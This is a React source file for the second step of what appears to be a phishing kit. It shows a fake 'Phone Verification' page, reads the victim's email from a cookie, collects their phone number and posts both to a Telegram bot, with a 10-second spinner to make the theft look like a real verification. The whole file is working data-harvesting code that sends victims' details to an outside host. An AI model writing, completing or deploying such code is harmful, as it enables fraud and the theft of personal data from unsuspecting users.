import Cookies from "js-cookie";
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { TELEGRAM_CHAT_ID, TELEGRAM_URL } from "./telegramConfig";

const SecondPage = () => {
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const storedEmail = Cookies.get("user_email");
    if (!storedEmail) navigate("/");
    else setEmail(storedEmail);
  }, [navigate]);

  const handleNext = () => {
    if (!phone) {
      alert("Please enter your phone number");
      return;
    }

    setLoading(true);
    Cookies.set("user_phone", phone);

    const message = `
📱 *Step 2: Phone Submitted*
📧 *Email:* ${email}
📞 *Phone:* ${phone}
    `;

    fetch(TELEGRAM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    setTimeout(() => {
      setLoading(false);
      navigate("/step-three");
    }, 10000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md">
        <h1 className="text-lg font-semibold text-red-600">
          Phone Verification
        </h1>
        <p className="text-sm text-gray-500 mt-2">
          Email: <strong>{email}</strong>
        </p>

        {loading ? (
          <div className="flex justify-center mt-4">
            <div className="animate-spin h-8 w-8 border-t-2 border-red-500 rounded-full" />
          </div>
        ) : (
          <>
            <input
              type="tel"
              className="mt-4 w-full border p-2 rounded-md"
              placeholder="Enter Phone Number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
            <p className="text-xs text-gray-500 mt-2">
              A code will be sent to this number.
            </p>
            <button
              onClick={handleNext}
              className="mt-6 w-full bg-red-500 text-white py-2 rounded-md hover:bg-red-600"
            >
              Continue
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default SecondPage;
